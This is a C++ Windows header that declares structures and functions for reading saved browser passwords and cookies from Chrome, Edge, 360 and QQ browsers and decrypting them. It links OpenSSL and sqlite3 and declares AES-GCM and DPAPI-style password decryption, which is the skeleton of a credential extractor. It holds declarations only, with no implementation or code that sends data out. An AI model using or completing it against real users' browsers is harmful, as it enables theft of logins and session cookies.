#pragma once
#include <Windows.h>
#include <string>
#include <vector>
#include <memory>

#include "include/cJSON/cJSON.h"
#include "include/base64/base64.h"
#include "include/sqlite3/sqlite3.h"
#include "include/openssl/conf.h"
#include "include/openssl/evp.h"
#include "include/openssl/err.h"
#include "include/openssl/aes.h"
#include "include/openssl/sha.h"
#include "include/openssl/md5.h"












//#include <dpapi.h>
#pragma comment(lib,"Crypt32.lib")

#ifdef _WIN64

#ifdef _DEBUG
#pragma comment(lib, "libcrypto64MTd.lib")
#pragma comment(lib,"libssl64MTd.lib")
#else
#pragma comment(lib, "libcrypto64MT.lib")
#pragma comment(lib,"libssl64MT.lib")

#endif


#else

#ifdef _DEBUG
#pragma comment(lib, "libcrypto32MTd.lib")
#pragma comment(lib,"libssl32MTd.lib")
#else
#pragma comment(lib, "libcrypto32MT.lib")
#pragma comment(lib,"libssl32MT.lib")
#endif


#endif


enum  BroType
{
	chrome,
	edge,
	speed360,
	safe360,
	QQ
};

typedef struct _BrowserData
{
	std::string bro_name;
	std::string bro_url;
	std::string user_name;
	std::string pass_word;
	std::string create_time;
}BrowserData, *PBrowserData;

typedef struct _BrowserCookies
{
	std::string bro_name;
	std::string host_key;
	std::string name;
	std::string value;
	std::string path;
	std::string expire_UTC;
	std::string has_expires;
	std::string is_persistent;
}BrowserCookies, *PBrowserCookies;

extern
bool CalcMd5(unsigned char *data, unsigned int src_len, unsigned char * buffer);

extern
bool Calcsha256(unsigned char * src, unsigned int src_len, unsigned char * buffer);

extern
std::string DecryptAes(std::string text,char* key);

extern
std::string replaceALL(const char* src, const std::string& target, const std::string& subs);

extern
std::shared_ptr<BYTE> MyGetRegValueA(HKEY hKey, const char* lpValueName, const char* lpVal);

extern
std::string int64timeToStr(__time64_t broTime);

extern
char* U2G(const char* utf8);

extern
long FileSize(FILE* f);

extern
bool _getPwd(BYTE* enPassword, int len, std::string& getPwd);


extern
BOOL AesGcmDecrypt(DATA_BLOB cipher, DATA_BLOB key, DATA_BLOB iv, PDATA_BLOB decrypted);

extern
BYTE* Decrypt(BYTE* enPassword, int len);

extern
int DecryptPassword(const DATA_BLOB encryptedPassword, const DATA_BLOB masterKey, PDATA_BLOB decryptedPassword);